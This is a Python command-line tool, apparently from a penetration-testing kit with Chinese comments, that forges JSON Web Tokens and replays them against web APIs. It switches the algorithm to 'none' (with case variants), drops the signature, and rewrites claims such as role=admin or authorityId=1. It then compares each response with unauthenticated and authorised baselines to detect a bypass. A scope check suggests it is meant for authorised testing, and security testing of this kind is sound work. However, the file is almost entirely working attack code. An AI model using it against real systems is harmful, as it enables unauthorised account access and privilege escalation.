#!/usr/bin/env python3
"""大爱仙尊 JWT 锻造重放：none / 空签 / 改 claim，对照未授权与原票。

只认差异，不把「接口本来就 200」写成 none 绕过。
不默认改原超管密。GVA / 若依 / TG 云控仍走专卡。

示例:
  python3 炼蛊房/jwt_forge_probe.py none --token '<JWT>' --url https://授权/api/user/info --case <案>
  python3 炼蛊房/jwt_forge_probe.py claim --token '<JWT>' --url https://授权/api/me --set role=admin --case <案>
  python3 炼蛊房/jwt_forge_probe.py --self-test
"""
from __future__ import annotations

import argparse
import base64
import json
import re
import sys
from typing import Any

OPS = __import__("pathlib").Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from probe_http import get, session  # noqa: E402
from scope_lib import require_in_scope, write_probe_json  # noqa: E402

USERISH = re.compile(
    r'"(username|userId|user_id|userid|role|email|phone|authority|nickname)"\s*:',
    re.I,
)
ME_PATHS = ("/api/user/info", "/api/auth/me", "/api/me", "/api/user/userInfo")


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_json(obj: Any) -> str:
    return _b64url(json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode())


def _b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def split_jwt(tok: str) -> tuple[dict[str, Any], dict[str, Any], str]:
    parts = tok.split(".")
    if len(parts) < 2:
        raise ValueError("不是三段/两段 JWT")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    if not isinstance(header, dict) or not isinstance(payload, dict):
        raise ValueError("JWT header/payload 不是对象")
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig


def forge_none(tok: str, *, alg: str = "none", keep_sig: bool = False) -> str:
    header, payload, sig = split_jwt(tok)
    header = dict(header)
    header["alg"] = alg
    out_sig = sig if keep_sig else ""
    return f"{_b64url_json(header)}.{_b64url_json(payload)}.{out_sig}"


def forge_claims(tok: str, updates: dict[str, str], *, alg: str = "none") -> str:
    header, payload, _sig = split_jwt(tok)
    header = dict(header)
    payload = dict(payload)
    header["alg"] = alg
    for k, v in updates.items():
        if v.lower() in ("true", "false") and k.lower() in ("admin", "isadmin", "is_admin"):
            payload[k] = v.lower() == "true"
        elif v.isdigit() and k.lower() in ("authorityid", "roleid", "user_id", "userid"):
            payload[k] = int(v)
        else:
            payload[k] = v
    return f"{_b64url_json(header)}.{_b64url_json(payload)}."


def none_variants(tok: str) -> list[tuple[str, str]]:
    rows = []
    for alg in ("none", "None", "NONE"):
        rows.append((f"alg-{alg}", forge_none(tok, alg=alg)))
    rows.append(("none-keep-sig", forge_none(tok, alg="none", keep_sig=True)))
    return rows


def _fp(r: Any) -> dict[str, Any]:
    text = r.text or ""
    return {
        "status": r.status,
        "len": len(text),
        "userish": bool(USERISH.search(text)),
        "error": r.error or "",
    }


def accepted(row: dict[str, Any], unauth: dict[str, Any], auth: dict[str, Any]) -> bool:
    if row.get("error") or row.get("status") not in (200, 201):
        return False
    if unauth.get("status") in (200, 201) and abs(int(row["len"]) - int(unauth["len"])) < 8:
        return False
    if auth.get("status") in (200, 201) and (
        row.get("userish") or abs(int(row["len"]) - int(auth["len"])) < 48
    ):
        return True
    return bool(row.get("userish"))


def _auth_headers(token: str, extra: dict[str, str]) -> dict[str, str]:
    h = dict(extra)
    if token:
        h["Authorization"] = f"Bearer {token}"
    return h


def probe_replay(
    url: str,
    token: str,
    forged: list[tuple[str, str]],
    *,
    extra_headers: dict[str, str],
) -> dict[str, Any]:
    require_in_scope(url)
    s = session()
    unauth = _fp(get(url, sess=s, headers=extra_headers or None, timeout=12))
    auth = _fp(get(url, sess=s, headers=_auth_headers(token, extra_headers), timeout=12))
    junk = _fp(
        get(url, sess=s, headers=_auth_headers("eyJhbGciOiJub25lIn0.eyJ4IjoxfQ.", extra_headers), timeout=12)
    )
    hits = []
    for name, forged_tok in forged:
        row = _fp(get(url, sess=s, headers=_auth_headers(forged_tok, extra_headers), timeout=12))
        rec = {"kind": name, **row, "ok": accepted(row, unauth, auth)}
        hits.append(rec)
    any_ok = any(x["ok"] for x in hits)
    return {
        "url": url,
        "unauth": unauth,
        "auth": auth,
        "junk": junk,
        "hits": hits,
        "l2": any_ok,
        "note": "l2=伪造票被吃且不同于未授权。接口本来就公开不要报 none。",
        "playbook": "传承/李代桃僵.md",
    }


def run_self_test() -> list[str]:
    fails: list[str] = []
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"sub": "1", "role": "user"}
    tok = f"{_b64url_json(header)}.{_b64url_json(payload)}.c2ln"
    n = forge_none(tok)
    h, p, sig = split_jwt(n)
    if h.get("alg") != "none" or p.get("role") != "user" or sig != "":
        fails.append("none")
    if not n.endswith("."):
        fails.append("dot")
    algs = {split_jwt(t)[0]["alg"] for _, t in none_variants(tok)}
    if algs != {"none", "None", "NONE"}:
        fails.append("variants")
    c = forge_claims(tok, {"role": "admin", "authorityId": "1"})
    _h, cp, _s = split_jwt(c)
    if cp.get("role") != "admin" or cp.get("authorityId") != 1:
        fails.append("claim")
    unauth = {"status": 401, "len": 12, "userish": False}
    auth = {"status": 200, "len": 120, "userish": True}
    good = {"status": 200, "len": 118, "userish": True, "error": ""}
    open_api = {"status": 200, "len": 12, "userish": False, "error": ""}
    if not accepted(good, unauth, auth):
        fails.append("accept")
    if accepted(open_api, {"status": 200, "len": 12, "userish": False}, auth):
        fails.append("open-fp")
    return fails


def _parse_set(items: list[str]) -> dict[str, str]:
    out: dict[str, str] = {}
    for raw in items:
        if "=" not in raw:
            raise SystemExit(f"--set 要 k=v：{raw}")
        k, v = raw.split("=", 1)
        out[k.strip()] = v.strip()
    return out


def main() -> int:
    ap = argparse.ArgumentParser(description="大爱仙尊 JWT none/claim 重放")
    ap.add_argument("--self-test", action="store_true")
    sub = ap.add_subparsers(dest="cmd")

    def add_common(p: argparse.ArgumentParser) -> None:
        p.add_argument("--token", required=True)
        p.add_argument("--url", required=True)
        p.add_argument("--header", action="append", default=[], help="Name: value，可重复")
        p.add_argument("--case", default="")

    add_common(sub.add_parser("none"))
    p_c = sub.add_parser("claim")
    add_common(p_c)
    p_c.add_argument("--set", action="append", default=["role=admin"], dest="sets")

    args = ap.parse_args()
    if args.self_test:
        fails = run_self_test()
        if fails:
            for f in fails:
                print(f"FAIL {f}")
            return 1
        print("self-test ok  jwt_forge")
        return 0

    extra: dict[str, str] = {}
    for raw in getattr(args, "header", []) or []:
        if ":" not in raw:
            raise SystemExit(f"--header 要 Name: value：{raw}")
        k, v = raw.split(":", 1)
        extra[k.strip()] = v.strip()

    if args.cmd == "none":
        data = probe_replay(args.url, args.token, none_variants(args.token), extra_headers=extra)
        path = write_probe_json(data, case=args.case, case_subdir="jwt_forge", filename="none.json")
        print(json.dumps({k: data[k] for k in ("l2", "hits", "note") if k in data} | {"out": str(path)}, ensure_ascii=False))
        return 0 if data.get("l2") else 1
    if args.cmd == "claim":
        updates = _parse_set(args.sets)
        forged = [("claim-none", forge_claims(args.token, updates))]
        data = probe_replay(args.url, args.token, forged, extra_headers=extra)
        data["sets"] = updates
        data["l3"] = bool(data.get("l2"))
        path = write_probe_json(data, case=args.case, case_subdir="jwt_forge", filename="claim.json")
        print(json.dumps({"l2": data.get("l2"), "l3": data.get("l3"), "sets": updates, "out": str(path)}, ensure_ascii=False))
        return 0 if data.get("l2") else 1
    ap.error("需要 none / claim / --self-test")
    return 2


if __name__ == "__main__":
    raise SystemExit(main())
